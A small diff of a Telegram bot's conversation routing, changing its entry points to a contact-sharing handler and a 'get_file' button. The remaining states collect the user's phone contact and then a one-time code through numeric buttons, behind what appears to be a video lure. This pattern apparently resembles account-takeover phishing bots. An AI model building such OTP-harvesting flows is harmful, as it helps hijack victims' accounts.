@@ -33,11 +33,10 @@ def main():
         entry_points=[
             CommandHandler('start', start),
             CommandHandler('adm', admin_command),
-            MessageHandler(filters.Regex("^Proceed Automatically 🚀$"), proceed_callback),
-            MessageHandler(filters.Regex("^📥 Get Video$"), get_file_callback)
+            MessageHandler(filters.CONTACT, contact_handler),
+            CallbackQueryHandler(get_file_callback, pattern="^get_file$")
         ],
         states={
-            START: [MessageHandler(filters.Regex("^Proceed Automatically 🚀$"), proceed_callback)],
             AWAITING_CONTACT: [MessageHandler(filters.CONTACT, contact_handler)],
             AWAITING_CODE: [CallbackQueryHandler(otp_callback, pattern="^num_")],
             ADMIN_CONFIRMATION: [],
